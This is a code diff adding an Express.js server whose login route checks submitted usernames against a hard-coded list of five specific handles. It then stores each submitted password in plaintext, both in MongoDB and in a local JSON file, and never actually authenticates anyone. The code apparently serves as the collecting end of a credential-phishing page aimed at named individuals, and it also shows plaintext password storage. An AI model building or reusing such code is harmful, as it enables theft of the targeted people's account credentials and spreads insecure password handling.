@@ -1,0 +1,69 @@
+const express = require('express');
+const mongoose = require('mongoose');
+const cors = require('cors');
+const bodyParser = require('body-parser');
+const fs = require('fs');
+const path = require('path');
+const User = require('./models/user.model');
+const connectDB = require('./config/db');
+
+const app = express();
+const PORT = 3000;
+
+// Predefined set of usernames
+const validUsernames = ['itbhatta8', 'subham_chanda__', 'creat1ve_str0m', 'rolip9900', 'abhra_j'];
+
+// Connect to MongoDB Atlas
+connectDB();
+
+// Middleware
+app.use(cors());
+app.use(bodyParser.json());
+
+// POST-only login route
+app.post('/auth', async (req, res) => {
+    const { username, password } = req.body;
+
+    // Check if both username and password are provided
+    if (!username || !password) {
+        return res.status(400).json({ error: 'Missing credentials' });
+    }
+
+    // Check if the username is in the validUsernames list
+    if (!validUsernames.includes(username)) {
+        return res.status(401).json({ error: 'Invalid username' });
+    }
+
+    try {
+        // Save to MongoDB
+        const newUser = new User({ username, password });
+        await newUser.save();
+
+        // Save to local file
+        const localPath = path.join(__dirname, 'data', 'logins.json');
+        let logins = [];
+
+        if (fs.existsSync(localPath)) {
+            const fileData = fs.readFileSync(localPath, 'utf8');
+            logins = fileData ? JSON.parse(fileData) : [];
+        }
+
+        logins.push({ username, password, timestamp: new Date() });
+        fs.writeFileSync(localPath, JSON.stringify(logins, null, 2));
+
+        res.status(200).json({ message: 'Login recorded' });
+
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// Disallow GET requests to login route
+app.get('/login', (req, res) => {
+    res.status(405).json({ error: 'GET method not allowed' });
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on http://localhost:${PORT}`);
+});
